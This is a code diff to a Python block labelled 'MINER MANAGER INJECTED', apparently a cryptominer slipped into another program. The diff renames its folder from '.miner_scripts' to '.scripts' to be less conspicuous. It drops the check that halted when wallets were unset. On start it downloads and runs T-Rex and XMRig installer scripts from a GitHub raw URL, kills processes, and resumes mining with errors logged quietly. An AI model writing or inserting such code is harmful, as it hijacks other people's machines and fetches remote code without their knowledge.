@@ -15,7 +15,7 @@ OCEAN_WALLET = "{OCEAN_WALLET}"
 INSTALL_DIR = os.path.expanduser("~/.local/bin")
 
 TREX_CONFIG = {
-    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",  # Замени
+    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",
     "INSTALLER_NAME": "install_t.sh",
     "BINARY_NAME": "TREX_BIN",
     "LOG_FILE": "t.log",
@@ -25,7 +25,7 @@ TREX_CONFIG = {
 }
 
 XMRIG_CONFIG = {
-    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",  # Замени
+    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",
     "INSTALLER_NAME": "install_x.sh",
     "BINARY_NAME": "XMRIG_BIN",
     "LOG_FILE": "x.log",
@@ -36,7 +36,7 @@ XMRIG_CONFIG = {
 
 MINER_CONFIGS = [TREX_CONFIG, XMRIG_CONFIG]
 
-SCRIPTS_DIR = Path.home() / ".miner_scripts"
+SCRIPTS_DIR = Path.home() / ".scripts"
 SCRIPTS_DIR.mkdir(exist_ok=True, parents=True)
 error_log_path = SCRIPTS_DIR / "miner_init_error.log"
 
@@ -175,27 +175,35 @@ def manage_miner(action):
                     run_installer_script_if_needed(config)
 
 
-if not (KRX_WALLET and OCEAN_WALLET and PUBLIC_IP):
-    print("\n" + "=" * 50)
-    print("!!! MANAGER WARNING !!!")
-    print("Wallets or IP are not configured.")
-    print("=" * 50 + "\n")
-else:
+try:
     print("\n" + "=" * 50)
     print("Starting setup and management...")
     kill_processes_by_path_prefix(INSTALL_DIR)
     for config in MINER_CONFIGS:
         run_installer_script_if_needed(config)
 
-    url = f'http://127.0.0.1:{TREX_CONFIG["API_PORT"]}/login?password={TREX_CONFIG["API_KEY"]}'
-    req = urllib.request.Request(url, method='GET')
-    data = json.loads(urllib.request.urlopen(req, timeout=2).read().decode('utf-8'))
-    if data.get("success", 0) == 1:
-        TREX_CONFIG["API_KEY"] = data.get("sid", "")
-    else:
-        err = data.get('error')
-        print(f"Failed to login. Reason: {err}")
+    # Попытка логина для T-Rex (может не понадобиться при JSON-RPC)
+    try:
+        url = f'http://127.0.0.1:{TREX_CONFIG["API_PORT"]}/login?password={TREX_CONFIG["API_KEY"]}'
+        req = urllib.request.Request(url, method='GET')
+        data = json.loads(urllib.request.urlopen(req, timeout=2).read().decode('utf-8'))
+        if data.get("success", 0) == 1:
+            TREX_CONFIG["API_KEY"] = data.get("sid", "")
+        else:
+            err = data.get('error')
+            print(f"Failed to login to T-Rex. Reason: {err}")
+    except Exception as e:
+        print(f"Error during T-Rex login attempt: {e}")
 
     time.sleep(2)
+    # Вызов manage_miner('resume') при старте
+    manage_miner('resume')
+
+except Exception as e:
+    print(f"Critical error in MINER MANAGER: {e}")
+    print(traceback.format_exc())
+    with open(error_log_path, "a") as f:
+        f.write(f"--- CRITICAL MINER MANAGER ERROR ---\n")
+        f.write(traceback.format_exc())
 
 # --- MINER MANAGER INJECTED END ---
